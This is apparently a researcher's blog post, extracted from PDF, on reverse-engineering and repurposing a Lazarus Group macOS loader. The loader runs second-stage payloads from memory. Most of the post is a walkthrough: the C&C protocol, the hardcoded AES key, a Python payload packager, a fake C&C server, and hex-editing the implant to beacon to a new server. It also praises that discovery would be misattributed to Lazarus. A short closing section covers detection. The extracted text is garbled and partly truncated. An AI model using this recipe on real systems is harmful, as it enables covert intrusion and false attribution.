Background 
Recently a new piece of macOS malware was discovered:

Capabilities: The in-memory execution of a remotely downloaded payloads. 
For a full technical analysis of the sample, read my writeup: ¡°Lazarus

While many aspects of the malware, such as its (launch daemon) persistence mechanism arend
quite prosaic, its ability to directly execute downloaded (¡°2 -stage¡±) payloads directly from memory is rather unique. Besides increasing stealth and complicating forensics analysis of said payloads (as they never touch the .le-system), it¡¯s just plain sexy! 
It also makes for the perfect candidate for ¡°repurposing¡±, which is what we¡¯ll walk-thru today. 

Repurposing Malware 
At DefCon #27, I gave a talk titled, ¡°Harnessing 
Weapons 
of 
Mac 
Destruction", 
which 
detailed 
the 
process of repurposing (or ¡°recycling¡±) other peoples¡¯ Mac malware: 
Watch Video At: https://youtu.be/InL3YA_6P6s 
In a nutshell, the idea is take existing malware and recon.gure (¡°repurpose¡± or ¡°recycle¡±) it for your own surreptitious purposes (i.e. testing, red-teaming, offensive cyber-operations, etc): The talk also covered the many bene.ts of repurposing others¡¯ malware; bene.ts that basically boil down to the fact that various well-funded groups and agencies are creating fully-featured malware, so why not leverage their hard work ¡­in a way (that if discovered) will likely be (mis)attribute back to them? 


¡­IMHO, it¡¯s a lovely idea .. To view the full slides from my talk, checkout: ¡°Harnessing 
Weapons 
of 
Mac 
Destruction¡± 
The Lazarus group¡¯s malware we¡¯re looking at today is a perfect candidate for repurposing. Why? 
st nd
As a 1 -stage loader, it simply beacons out to a remote server for 2 -stage payloads (which as noted, are executed directly from memory). Thus once we understand its protocol and the 
expected format of the payloads, (in theory) it should be rather trivial to repurpose the loader tond
communicate instead with our server, and thus stealthily execute our own 2 -stage payloads! 
st
This gives us ¡®access¡¯ then, to an advanced 1 -stage loader that will execute our custom payloads (from memory!) ¡­without us having to write a single-line of (client-side) code. .. 
Better yet, as the repurposing-modi.cations will be minimal, if this repurposed sample is evernd
detected, it surely well be (mis)attributed back to the original authors (and as our 2 -stage payloads never hit the .le-system, will more than likely remain undetected) .. .. #winning 

Repurposing Lazarus¡¯s Loader 
After identifying a malware specimen to repurpose (¡°recycle¡±), the next step is to comprehensively understand how it works: 

The goal of this analysis phase is to: 

Identify 
the method of persistence 


Understand 
the capabilities / payload 


Identify 
the command & control server 


Understand 
the communications protocol 


In a previous blog post, ¡°Lazarus 
Group 
Goes 
¡®Fileless¡¯¡± we thoroughly analyzed the sample and answered the majority of these questions. 
However, I did not discuss the malware¡¯s communications protocol, speci.cally the format of thend
response from the remote server ¡­the response that contains the 2 -stage payload(s). As our nd
ultimate goal is to repurpose this malware such that it executes our own 2 -stage payloads, this protocol and payload format is essential to understand! 
To facilitate dynamic analysis and to understand the malware protocol, I created a simple python HTTPS server that would respond to the malware¡¯s requests. 
Although (initially) I did not know the expected format of the data, trial and error (plus a healthy dose of reverse-engineering) proved suf.cient! 
# python server.py 
[+] awaiting connections [+] new connection from 192.168.0.2: 
======= POST HEADERS ======= Host: unioncrypto.vip Accept: */* auth_signature: ca57054ea39f84a6f5ba0c65539a0762 auth_timestamp: 1581048662 Content-Length: 62 Content-Type: application/x-www-form-urlencoded

Armed with a simple (initially bare-boned) custom C&C server to respond to the malware¡¯s requests, we can begin to understand the network protocol, with the ultimate goal of
nd
understanding how the 2 -stage payloads should be remotely delivered to the malicious loader, on infected systems. 
First, we note that on check in the malware provides some (basic) information after the infected system (e.g. the macOS version/build number: Mac OS X 10.15 (19A603) , serial number: 
VMI5EOhq8gDz , etc.), and implant version ( 'ver', '1.0' ). 
Moving on we can hop into a disassembler to look at the malware¡¯s code responsible for connecting to the C&C server, and parsing/processing the server¡¯s response. 
In the malware¡¯s disassembly we .nd a function named onRun() that invokes a method named 
Barbeque::post . This method connects to the remote server ( https://unioncrypto.vip/ ) and expects the server to respond with an HTTP 200 OK . Otherwise it takes a nap (before trying again): 
1int onRun() { 2 3 ... 4 5 //connect to server 6 Barbeque::post(...); 7 if(response != 200) goto sleep; 8 9} 
Assuming the (our) server responds with an HTTP 200 OK , the malware checks that at least 0x400 bytes were received, before base64-decoding said bytes: 
1int onRun() { 2 3 ... 4 5 //rdx: # of bytes 6 // make sure at least 0x400 bytes were recv'd 7 if ((rdx >= 0x400) && ...))) 8{ 9 
10 //rbx: recv'd bytes 11 // base64 decond recv'd bytes 12 rax = base64_decode(rbx, &var_80); 13 14 ... 15} 
nd
¡­so already, we know the server¡¯s response (which the malware expects to be a 2 -stage payload) must be at least 0x400 in length ¡­and base64 encoded. As such, we update our custom C&C server to respond with at least 0x400 bytes of base64 encoded data (that for now, just decodes to ABCDEFGHIJKLMNOPQRSTUVWXYZABCD... ). 
Once we respond with the correct number ( 0x400 +) of base64 encoded bytes, the malware happily continunes and invokes a function named processUpdate (at address 0x0000000100004be3 ). In a debugger, we can see this function takes the (base64 decoded) bytes (in RDI ) and their length (in RSI ): 
$ lldb unioncryptoupdater 
... 
(lldb) b 0x0000000100004be3 Breakpoint 1: where = unioncryptoupdater`processUpdate(unsigned char*, unsigned long), address = 0x0000000100004be3 
(lldb) r 
... 
(lldb) Process 2813 stopped 
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1 frame #0: 0x0000000100004be3 unioncryptoupdater`processUpdate(unsigned char*, unsigned long)

(lldb) reg read $rsi rsi = 0x000000000000401 
As shown in the debugger output, so far, the malware is content with our server¡¯s response, as the response is over 0x400 bytes in length and encoded correctly. (Note our decoded bytes, ABC... in the rdi register). 
In 
the 
previous 
blog 
post, 
we 
noted 
that 
the 
processUpdate function calls into a method named nd
load_from_memory to, well, load (and execute) the received bytes ¡­the 2 -stage payload(s). However, before it invokes this function it calls two other functions: 

md5_hash_string aes_decrypt_cbc 

1int processUpdate(int * arg0, long arg1) { 2 3 ... 4 5 rax = md5_hash_string(&var_4D8); 6 r15 = rbx + 0x10; 7 rdx = r14 -0x10; 8 if ((var_4D8 & 0x1) != 0x0) { 9 rcx = var_4C8; 
10 
} 11 else { 12 rcx = &var_4D7; 

13 
} 14 _aes_decrypt_cbc(0x0, r15, rdx, rcx, &var_40); 15} 


Let¡¯s step thru this in a debugger to see what it¡¯s hashing, and what/how it¡¯s ( AES ) decrypting. 
Using our simple python HTTPS (C&C) server we¡¯ll serve up again 0x400 + bytes of ABCDEFGHIJKLMNOPQRSTUVWXYZABC... : 
$ lldb unioncryptoupdater 
(lldb) x/i $pc 0x100004c58 <+117>: callq 0x100004dab ; md5_hash_string(...); 
//print out bytes passed to md5_hash_string() // recall that $rsi will contain the first arg (lldb) x/24bx $rsi 0x100008388: 0x18 0x56 0x4d 0x49 0x35 0x45 0x4f 0x68 0x100008390: 0x71 0x38 0x67 0x44 0x7a 0x00 0x00 0x00 0x100008398: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 
//print out as a string (lldb) x/s $rsi+1 0x100008389: "VMI5EOhq8gDz" 
Stopping at the call to the md5_hash_string function, we can dump the string being passed in. Turns out it¡¯s: VMI5EOhq8gDz (albeit pre.xed with 0x18 ). 
The calling convention utilized by macOS is the ¡°System V¡± 64-bit ABI ¡­which always passes the .rst argument in the rsi register. 
¡°System V operating systems [and macOS] will use RDI, RSI, RDX, RCX, R8 and R9. XMM0, XMM1, XMM2, XMM3, XMM4, XMM5, XMM6 and XMM7 will be used to pass .oating point parameters. RAX will hold the syscall number. Additional arguments are passed via the stack (right to left). 
Return values are sent back via RAX.¡± 
-64bit 
ABI 
Cheatsheet 

Once the malware has generated an MD5 hash of this string, it invokes the aes_decrypt_cbc function. What does it pass in? 
In the disassembler, the aes_decrypt_cbc function is invoked in the following manner: _aes_decrypt_cbc(0x0, r15, rdx, rcx, &var_40); Hopping back into the debugger we can determine what the r15 , rdx , and rcx registers hold: 
$ lldb unioncryptoupdater 
(lldb) x/i $pc 0x100004c85 <+162>: callq 0x100004095 ; aes_decrypt_cbc 
(lldb) x/s $r15 0x100800610: "QRSTUVWXYZABCDEF... 
(lldb) reg read $rdx rdx = 0x00000000000003F1 
(lldb) x/16xb $rcx 0x7ffeefbff279: 0x26 0x1d 0xfd 0xb9 0x70 0x43 0x84 0xf4 0x7ffeefbff281: 0xf7 0x37 0xe0 0x1c 0x55 0x7a 0xee 0x74 

r15 
: appears to be a pointer into the received (now base64 decoded) bytes. Looking back a few instructions in the disassembly we see: r15 = rbx + 0x10 ( rbx is a pointer to the start of the received decoded bytes). 

Thus, r15 points exactly 0x10 ( 16d ) bytes into the received, decoded bytes. 


rdx 
: appears to be 0x10 less than the size of the total (received) decoded bytes. Again, a few instructions back, we see: rdx = r14 -0x10 ( r14 holds the total sized of the received decoded bytes). 

In other words, rdx is the remaining size of the (received) decoded bytes (from r15 to the end!). 


rcx 
: appears initially to be a pointer some random/unknown bytes ( 0x26 0x1d 0xfd 0xb9 ... ). However, by looking back in the disassembly, we can see it¡¯s the result of hashing the VMI5EOhq8gDz string! 


We can also con.rm this, by manually ( MD5 ) hashing VMI5EOhq8gDz , which results in 0x26 0x1d 0xfd 0xb9 ... (matching rcx ): 
1password = 'VMI5EOhq8gDz' 2key = hashlib.md5(password).digest() 3 4print('\nkey: '), 5for i in range(len(key)): 6 print('%x' % (ord(key[i]))), 7} 
¡­which prints out the (expected) key: 26 1d fd b9 70 43 84 f4 f7 37 e0 1c 55 7a ee 74 
We now understand the parameters passed to the aes_decrypt_cbc function: 

arg 
0 ( 0x0 ): likely the iv ( NULL ) 


arg 
1 (from $r15 ): pointer to cipher text 


arg 
2 (from $rdx ): length of cipher text 


arg 
3 (from $rcx ): key ( MD5 of the string VMI5EOhq8gDz ) 


arg 
4 ( &var_40 ): aes ¡°context¡± 


Thus, the malware is ( AES ) decrypting the received (now base64 decoded) payload, with key = MD5("VMI5EOhq8gDz") . 
After decrypting the received bytes, the malware initializes a pointer 0x90 bytes into the received bytes, and a variable with the size of the remaining bytes, before invoking the load_from_memory function: 
1rbx = rbx + 0x90; 2r14 = r14 -0x90; 3 4rax = load_from_memory(rbx, r14, &var_C0, rcx, &var_40, r9); 
Before discussing the parameters passed to this function let¡¯s update our custom C&C server to serve up the same data from a .le ( ABCDEF... ), but this time AES encrypted with the hash of "VMI5EOhq8gDz" . ¡­we also make sure to skip the .rst 0x90 bytes (as the malware skips over 
these): 
1password = 'VMI5EOhq8gDz' 2key = hashlib.md5(password).digest() 3 4iv = 16 * '\x00' 5encryptor = AES.new(key, AES.MODE_CBC, iv) 6 7with open(in_filename, 'rb') as infile: 8 with open(out_filename, 'wb') as outfile: 9 
10 data += 0x10 * '\x00' 
11 chunk = 0x80 * '\x00' 
12 data += encryptor.encrypt(chunk) 
13 
14 while True: 
15 chunk = infile.read(chunksize) 
16 if len(chunk) == 0: 
17 break 
18 elif len(chunk) % 16 != 0: 
19 chunk += ' ' * (16 -len(chunk) % 16) 
20 
21 data += encryptor.encrypt(chunk) 
22 
23 outfile.write(base64.b64encode(data)) 
Setting a breakpoint on the call to the load_from_memory function ( 0x0000000100004cb8: call load_from_memory ), we can now dump the parameters (and con.rm that the encryption in our custom C&C server is correct): 
$ lldb unioncryptoupdater 
(lldb) x/i $pc 0x100004cb8 <+213>: callq 0x100006dda ; load_from_memory 
//1st arg (lldb) x/s $rdi 0x101002290: "ABCDEFGHIJKLMNOPQRSTUVWXYZ... 
(lldb) reg read $rsi r14 = 0x0000000000000371 
Recalling that the .rst and second arguments are passed in via the rdi and rsi registers, respectfully, in the above debugger output we can see the malware is passing our now decoded, decrypted ¡°payload¡± ( ABC... ) and size, to the load_from_memory function. 
Hooray, this con.rms that our detailed analysis has correctly uncovered both the format, encoding, and encryption of the server¡¯s expected response. 
In summary: 

encoding: base64 

encryption: AES ( CBC -mode), with a null-IV, and key of MD5("VMI5EOhq8gDz") 

format: 0x400 + bytes, payload starting at offset 0x90 
As we now fully understand the format of the malware¡¯s protocol, in theory, we should be able remote transmit an encrypted & encoded binary payload and have the malware execute directly from memory! 
¡­but .rst a brief discussion of the malware¡¯s ¡°load and execute from memory¡± code. 
In my previous writeup, ¡°Lazarus 
Group 
Goes 
¡®Fileless¡¯", I detailed exactly how the malware nd
executed the 2 -stage payload from memory. To (re)summarize: 

The 
load_from_memory function mmaps some memory (with protections: PROT_READ | PROT_WRITE | PROT_EXEC ), then copies the decrypted payload into this memory region, before invoking a function named memory_exec2 . 


The 
memory_exec2 function invokes the Apple API 

NSCreateObjectFileImageFromMemory to create an ¡°object .le image¡± from a memory buffer (of a mach-O .le) then invokes the NSLinkModule function to link the ¡°object .le image¡±. 


Once 
the malware has mapped and linked the downloaded payload, it invokes a function named find_macho which appears to search the memory mapping for MH_MAGIC_64 ( 0xfeedfacf ), the 64-bit ¡°mach magic number¡± in the mach_header_64 structure. 


Once 
the find_macho method returns, the malware begins parsing the mapped/linked ( mach-O ) payload, looking for the address of LC_MAIN load command ( 0x80000028 ), which contains information such as the entry point of the in-memory code. 


The 
malware then retrieves the offset of the entry point (found at offset 0x8 within the 


LC_MAIN load command), sets up some arguments, then jumps to this address, to kick off the execution of the payloads binary code. 
1//rcx points to the `LC_MAIN` load command 2r8 = r8 + *(rcx + 0x8); 3... 4 5//invoke payload's entry point! 6rax = (r8)(0x2, &var_40, &var_48, &var_50, r8); 
Skimming over the disassembly of the memory_exec2 reveals some interesting code snippets, such as the following: 
1//RDI points to the mach-O header (of the payload) 2// offset 0xC in a mach-O header is file type (`uint32_t filetype`) 3rbx = *(int32_t *)(rdi + 0xc); 4if (rbx != 0x8) { 5 *(int32_t *)(rdi + 0xc) = 0x8; 6} 
Stepping thru this code in a debugger, reveals it is checking the type of the ( mach-O ) binary payload ( MH_EXECUTE , MH_BUNDLE , etc). If the mach-O .le type is not MH_BUNDLE ( 0x8 ), it updates the (in-memory) type to be this value: *(rdi + 0xc) = 0x8 . 
Process 2866 stopped 
* stop reason = breakpoint 1.1 
unioncryptoupdater`memory_exec2: 
-> 0x1000069c0 <+33>: cmpl $0x8, %ebx ;0x8: MH_BUNDLE

(lldb) reg read $rbx rbx = 0x0000000000000002 ;0x2: MH_EXECUTE 
This 
is 
done, 
(as 
online 
research 
notes) 
as 
the 
man page for NSModule state: ¡°Currently the implementation is limited to only Mach-O MH_BUNDLE types which are used for plugins." Thus in order to play nicely with the Apple APIs and thus support the in-memory execution of ¡®standard¡¯ 
mach-O executables (type: MH_EXECUTE ), this ¡®patch¡¯ must be applied. 
However, the most interesting thing about this snippet of code found within the malware, is that it¡¯s not original¡­ 
In 2017, Cylance published a blog post titled: ¡°Running 
Executables 
on 
macOS 
From 
Memory". 
Though the topic of in-memory code execution on macOS had been covered before (as was noted in the blog post), the post provided a comprehensive technical deep-dive into the topic, and more importantly provided an open-source project which included code to perform in-memory loading: ¡°osx_runbin". 
The researcher (Stephanie Archibald), also presented this research (and more!) at an In.ltrate talk: 
daveaitel 
@daveaitel 
Here we are learning modernized osx rootkits (userland) from 
Stephanie Archibald ! 
If w y loader code found 
with¡­in other words, the Lazarus group coders simply leveraged (copied/stole) the existing open-source osx_runbin code in order to give their loader, advanced stealth and anti-forensics capabilities. And who can blame them? Work smart, not hard, right!? ..

Ok, so let¡¯s start to wrap this all up, and (.nally!) illustrate the full repurposing of the Lazarus group¡¯s loader, so that it beacons to our C&C server to download and execute (from memory), our 2nd-stage payloads! 
Step one is to modify the loader so that it beacons to our C&C server for tasking. 
Looking in the disassembler, we .nd the hardcoded address of the malware C&C server: https://unioncrypto.vip/update : 

Popping into a hexeditor, we can modify this to whatever URL or IP address we¡¯d like the malware to now connect to (i.e. to from https://unioncrypto.vip/update to https://allyourbase.belong/ ): 

One the malware checks in:

nd
¡­we should be able to serve up our 2 -stage payloads! 
Step two is to prepare and package up these payloads. This involves encrypting ( AES , key: MD5("VMI5EOhq8gDz") ) any mach-O binary and placing that at offset 0x90 within the server¡¯s base64-encoded response. 
During our analysis phase, we had (already) put together some basic python code, to implement this logic: 
1import os, random, struct, hashlib, base64 2from Crypto.Cipher import AES 3 4password = 'VMI5EOhq8gDz' 5key = hashlib.md5(password).digest() 6 7def encryptFile(key, in_filename, out_filename=None, chunksize=64*1024): 8 9 iv = 16 * '\x00' 
10 encryptor = AES.new(key, AES.MODE_CBC, iv) 
11 
12 data ="" 
13 
14 with open(in_filename, 'rb') as infile: 
15 with open(out_filename, 'wb') as outfile: 
16 
17 data += 0x10 * '\x00' 
18 chunk = 0x80 * '\x00' 
19 data += encryptor.encrypt(chunk) 
20 
21 while True: 
22 chunk = infile.read(chunksize) 
23 if len(chunk) == 0: 
24 break 
25 elif len(chunk) % 16 != 0: 
26 chunk += ' ' * (16 -len(chunk) % 16) 
27 
28 data += encryptor.encrypt(chunk) 
29 
30 outfile.write(base64.b64encode(data)) 
31 
32encryptFile(key, 'payloadBEFORE', 'payloadAFTER') 
Now we just need a test payload ¡­a standard "Hello World" binary should suf.ce: 
1#import <Foundation/Foundation.h> 2 3int main(int argc, const char * argv[]) { 4 @autoreleasepool { 5 // insert code here... 6 NSLog(@"Hello, World!"); 
7} 8 return 0; 9} 
After compiling this "Hello World" code into a mach-O binary, we run it thru our python ¡°deployment¡± script which encrypts, encodes, and packages it all up: 
$ python deploy.py

Now, we simply modify our custom C&C server to serve up this processed payload when the repurposed malware checks in with our server: 
# python server.py 
[+] awaiting connections [+] new connection from 192.168.0.2 
======= POST HEADERS ======= Host: allyourbase.belong ... 
[+] responding with 2nd-stage payload (42264 bytes) 
Setting a breakpoint within the memory_exec2 function (speci.cally at 0x0000000100006af6 , the call into the payload¡¯s main /entrypoint), allows us to con.rm that our payload has been successfully transmitted to the remote (now repurposed) loader, unpackaged, decoded, and decrypted successfully: 
(lldb) b 0x0000000100006af6 Breakpoint 2: where = unioncryptoupdater`memory_exec2  + 343  
...  
Process 2866 stopped * thread #1, stop reason  =  breakpoint  2.1  
unioncryptoupdater`memory_exec2 + 343: -> 0x100006af6 <+343>: callq *%r8

¡­and if we continue ( c ), our 2 -stage payload is successfully executed on the infected system, directly from memory!

Hooray, we¡¯re stoked! .. 
Detection 
Before ending, I want to brie.y discuss detection of this threat (either in it¡¯s pristine or repurposed state). 
First, it¡¯s rather trivial to detect the malware¡¯s (launch daemon) persistence (e.g. via 
BlockBlock): 
Our .rewall 
LuLu 
will 
also 
detects 
the 
unauthorized 
network 
traf.c 
to 
the 
attacker 
(or 
our!) 
C&C 
server: 


nd 
tricker (which is one of the reasons why attacker have begun to utilize this technique!). 
Good news though (from the detection point of view), the well-known macOS security researcher (and 
former 
#OBTS 
speaker!)

titled: ¡°Using ESF to Detect In-Memory Execution¡± 

Richie Cyrus
@rrcyrus 
For the past few months, I've been diving into Apple's Endpoint Security Framework. This post shares how I use the framework 
for detection engineering purposes. posts.specterops.io/detection-engi¡­35711:35 PM - Jan 30, 2020140 people are talking about thisIn his, post he notes that via Apple¡¯s new Endpoint Security Framework (ESF), we can track various events, such as memory mappings ( ES_EVENT_TYPE_NOTIFY_MMAP ) which (when combined with other observable events delivered by the ESF) may be used to detect the execution of an in-memory payload: 
"Of the event types, ES_EVENT_TYPE_NOTIFY_MMAP stands out as there was a call to mmap in the PoC code which generated the Calculator execution..." 
Unfortunately, without a kernel extension (which Apple is rapidly deprecating), as far as I know,nd
there is no way to dump a process¡¯s memory contents. Thus even if we are to detect that a 2 -stage payload is executing from memory, we won¡¯t be to capture the payload (i.e. dump it from memory). Apple, a little help here!? 
For more on the topic of memory forensics on macOS, check out the following (insightful!) thread: 
Matt Suiche@msuicheMemory scanning capabilities on macOS are pretty bad ingeneral. But this abolition of kexts for macOS will de.nitely makeit impossible to access the memory if no access to kernel modewill be possible. twitter.com/patrickwardle/¡­patrick wardle@patrickwardleMatt raises an excellent point - we need memory scanning/ forensicscapabilities for macOS.Ex: Lazarus group recently deployed a 1st-stage implant able toexecute 2nd-stage payloads directly from memory (objective-see.com/blog/blog_0x51¡­)So, what are options now? twitter.com/msuiche/status¡­212:22 PM - Feb 9, 2020See Matt Suiche's other Tweets

Conclusion 
Lazarus group proves yet again to be a well-resourced, persistent threat, that continues to target macOS users with ever evolving capabilities. ¡­so why not repurpose their malware for our own surreptitious purposes!? 
Traditionally, repurposed malware has only been leveraged by sophisticated cyber adversaries: 

However in this blog post, we illustrated exactly how to ¡°recycle¡± Lazarus latest implant, unioncryptoupdater , in a few, fairly straightforward steps. 
Speci.cally, after reversing the sample to uncover its encryption key and encoding mechanism, we built a simple C&C server capable to speaking the malware¡¯s protocol. And after overwriting the embedded address of the attacker¡¯s C&C server in the malware¡¯s binary, with our own, the repurposing was wholly complete. 
st nd
End result? An advanced persistent 1 -stage implant implant, capable of executing our 2 -stage payloads, directly from memory! And besides not having to write a single line of ¡°client-side¡± code, if our repurposed creation is ever discovered it will surely be (mis)attributed back to the Lazarus group. Win-freaking-Win!? 
¡­and 
no, 
Catalina¡¯s 
notarization 
requirements, 
will 
not 
thwart 
our 
¡°repurposed¡± creations! ..
